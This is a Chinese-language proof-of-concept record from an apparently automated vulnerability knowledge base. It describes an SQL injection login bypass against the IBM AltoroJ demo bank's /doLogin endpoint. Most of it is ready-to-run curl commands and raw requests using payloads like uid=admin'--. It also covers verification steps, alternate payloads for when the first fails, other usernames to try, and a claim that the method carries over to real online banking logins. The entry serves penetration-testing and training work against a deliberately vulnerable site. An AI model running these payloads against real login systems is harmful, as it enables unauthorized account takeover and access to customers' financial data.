# IBM Altoro Mutual 演示银行 (AltoroJ/Tomcat) POST /doLogin uid 参数 SQL 注入导致任意口令登录认证绕过

- **code**: altoroj-dologin-uid-sqli-auth-bypass
- **kind**: poc
- **category**: auth-bypass
- **component**: IBM Altoro Mutual 演示银行 (testfire.net / AltoroJ, Apache-Coyote/1.1 + Tomcat/7.0.92)
- **severity**: critical
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#643 / finding_id=1314，2026-11-08 11:32-11:34 (UTC+8) 本机 Windows curl.exe 直连 http://demo.testfire.net 实测成立：① 阴性对照 uid=admin&passw=zzzz_bad_pass_123 → 302 login.jsp（失败）；② uid=admin'--&passw=WrongPass123 → 302 /bank/main.jsp 并下发 JSESSIONID 与 AltoroAccounts cookie；③ 带该 JSESSIONID GET /bank/main.jsp → 200，正文 <h1>Hello Admin User ... Sign Off>；④ uid=jsmith'--&passw=x → 302 /bank/main.jsp，同法进入页面显示 Hello John Smith；⑤ 阴性对照 uid=nosuchuser999'--&passw=x → 302 login.jsp（不存在用户失败，排除服务端完全不校验）；⑥ uid=admin'&passw=x → 302 login.jsp，随后 GET login.jsp 正文出现 Syntax error: Encountered "x" at line 1, column 67（报错型注入铁证）。原始响应存 D:\ARTEX\data\tasks\643\i12513\。
- **path**: pocs/altoroj-dologin-uid-sqli-auth-bypass/altoroj-dologin-uid-sqli-auth-bypass.md
- **tags**: sqli, auth-bypass, login-bypass, altoroj, testfire, tomcat, java, comment-truncation, error-based, demo-bank
- **created_at**: 2026-11-08T11:35:29.388Z
- **engine**: http://demo.testfire.net
- **found_by**: exploit

## 描述

AltoroJ 演示银行登录接口 POST /doLogin 把表单字段 uid 以字符串拼接方式放进 SQL 的 WHERE 用户名条件，未做任何转义/参数化。注入 admin'-- 即可闭合字符串并注释掉其后的 AND passw='...' 口令条件，从而对库中任意"已存在用户名"用任意口令登录成功，拿到合法会话并进入网银会员区。前提：目标可达、login.jsp 表单存在，无需任何凭据。适用面：所有 AltoroJ 派生/演示版网银、以及同一形态（uid/passw 拼接查询）的 Java 登录页。

## 用法

```
1) 指纹与入口：curl -s http://<TARGET>/login.jsp | grep -i 'action="doLogin"'，确认字段 uid / passw / btnSubmit。2) 失败基线（必做，建立"正常口令被拒"的对照）：curl -s -o /dev/null -D - -d 'uid=admin&passw=zzzz_bad_pass_123&btnSubmit=Login' http://<TARGET>/doLogin → 期望 302 且 Location: login.jsp。3) 注入：curl -s -c jar.txt -o /dev/null -D - --data-urlencode "uid=admin'--" --data-urlencode 'passw=WrongPass123' --data-urlencode 'btnSubmit=Login' http://<TARGET>/doLogin → 期望 302 Location: /bank/main.jsp + Set-Cookie(JSESSIONID / AltoroAccounts)。4) 验活（不要只看 302）：curl -s -b jar.txt http://<TARGET>/bank/main.jsp | grep -i 'Hello .* User\|Sign Off'。5) 换用户证明非特例：uid=jsmith'--、uid=tuser'--。6) 报错型佐证：uid=admin'&passw=x → 302 login.jsp，再 GET /login.jsp 应见 Syntax error: Encountered "x" at line <n>。注意：-- 后必须带空格或直接结束（用 --data-urlencode 传 "admin'--" 即可）；某些客户端把 -- 当参数分隔，务必加引号/URL 编码。仅限授权测试。
```

## 正文

```
# AltoroJ /doLogin uid SQL 注入 → 认证绕过

## 0. 前置条件
- 目标可达，`http://<TARGET>/login.jsp` 返回 200，页面含表单：
  `<form action="doLogin" method="post">`，字段 `uid` / `passw` / `btnSubmit=Login`。
- 无需任何已知口令、无需注册。数据库为内嵌 Derby/DB2 语法（AltoroJ 自带脚本可参考），报错会回显到 login.jsp。
- 指纹：`Server: Apache-Coyote/1.1`，AltoroJ 风格页面，`/bank/main.jsp` 为会员区。

## 1. 基线对照（必须做，否则无法证明"绕过"）
```bash
curl -s -o /dev/null -D - \
  -d 'uid=admin&passw=zzzz_bad_pass_123&btnSubmit=Login' \
  http://<TARGET>/doLogin
# 期望：HTTP/1.1 302 Found
#       Location: login.jsp
```

## 2. 注入（核心一条）
```bash
curl -s -c jar.txt -o /dev/null -D - \
  --data-urlencode "uid=admin'--" \
  --data-urlencode 'passw=WrongPass123' \
  --data-urlencode 'btnSubmit=Login' \
  http://<TARGET>/doLogin
# 期望：HTTP/1.1 302 Found
#       Location: /bank/main.jsp
#       Set-Cookie: JSESSIONID=<REDACTED>; Path=/; HttpOnly
#       Set-Cookie: AltoroAccounts="<REDACTED base64 账户清单>"; Version=1
```
等价原始报文：
```http
POST /doLogin HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

uid=admin'--&passw=WrongPass123&btnSubmit=Login
```
原理：服务端拼成 `... WHERE uid='admin'--' AND passw='WrongPass123'`，`--` 注释掉口令条件，
命中已存在的 `admin` 行即登录成功。口令完全无效也可。

## 3. 验活（判据 —— 302 不是终点）
```bash
curl -s -b jar.txt http://<TARGET>/bank/main.jsp | grep -iE 'Hello .*(User|Smith)|Sign Off'
# 期望：<h1>Hello Admin User</h1> ... <a href="/logout.jsp">Sign Off</a>
```
只看 302 会被 WAF/跳转误导；必须以会员区页面出现"Hello &lt;姓名&gt;" + Sign Off 链接为成立判据。

## 4. 证明对任意已存在用户生效（非 admin 特例）
```bash
curl -s -c j2.txt -o /dev/null -D - \
  --data-urlencode "uid=jsmith'--" -d 'passw=x&btnSubmit=Login' \
  http://<TARGET>/doLogin
# 302 → /bank/main.jsp；GET /bank/main.jsp（带 j2.txt）→ <h1>Hello John Smith</h1>
```
其它演示账户：`tuser`、`jdoe`、`ssmith`（以目标实际数据为准，逐个试名字 + `'--`）。

## 5. 阴性对照（决定结论强度的两条）
```bash
# 5.1 不存在的用户：不应登录成功
curl -s -o /dev/null -D - --data-urlencode "uid=nosuchuser999'--" \
  -d 'passw=x&btnSubmit=Login' http://<TARGET>/doLogin
# 期望：302 Location: login.jsp  ← 说明服务端确实按用户名查行，不是"完全不校验"

# 5.2 正确用户名 + 正确格式错误口令（不含注入符）
#        302 login.jsp ← 说明口令条件本身有效，只是被 -- 注释掉了
```

## 6. 报错型佐证（证明输入真的进了 SQL 解析器）
```bash
curl -s -o /dev/null -D - --data-urlencode "uid=admin'" -d 'passw=x&btnSubmit=Login' \
  http://<TARGET>/doLogin          # 302 login.jsp
curl -s http://<TARGET>/login.jsp | grep -i 'Syntax error'
# 期望：Syntax error: Encountered "x" at line 1, column 67.
```
把 `<n>` 列号与后续 payload 长度对照，可验证注入串被拼进同一条语句（列号随 payload 变化）。

## 7. 失败时的常见原因
| 现象 | 原因 / 处理 |
|---|---|
| 302 到 login.jsp，会员区打不开 | `--` 被客户端吞掉：必须 URL 编码 `%2D%2D` 或 `--data-urlencode` 传 `admin'--` |
| 302 login.jsp 且无 Syntax error | 该实例已按用户名参数化查询（新版 AltoroJ / 加固过的 demo），换 `admin' AND '1'='1` / `admin' OR '1'='1' --` 再试一次后放弃 |
| 500 / 空响应 | `--` 前缺空格被当作运算符；改 `admin' -- `（加空格）或 `admin'%23`（MySQL 风格注释，视后端而定） |
| 登录成功但立刻回登录页 | 需同时接收 `AltoroAccounts` cookie，curl 用 `-c/-b` 同一 jar 文件 |
| 报错页被 WAF 拦截页取代 | 先取基线字节数，只用 302 Location 差分判定，别把拦截页当注入证据 |

## 8. 附带信息
- `/login.jsp` HTML 注释中曾出现运营联系方式（`<!-- To get the latest admin login, please contact SiteOps at ... -->`）—— 属信息泄露，可作为社工/口令线索，但不是本条目主判定。
- 同一目标另有 `/search.jsp?query=` 反射型 XSS（KB: `testfire-altoro-search-jsp-query-reflected-xss`）。
- 影响面：拿到的是真实会员会话（含 AltoroAccounts 账户清单 cookie），可进一步枚举账户余额/转账功能；演示环境无资金，但形态对真实网银同样成立。

## 9. 一句话判据
`uid=admin'--` + 任意口令 → 302 `/bank/main.jsp` → 带会话 GET `/bank/main.jsp` 出现 "Hello Admin User" ，且 `uid=nosuchuser999'--` 必须失败。

```
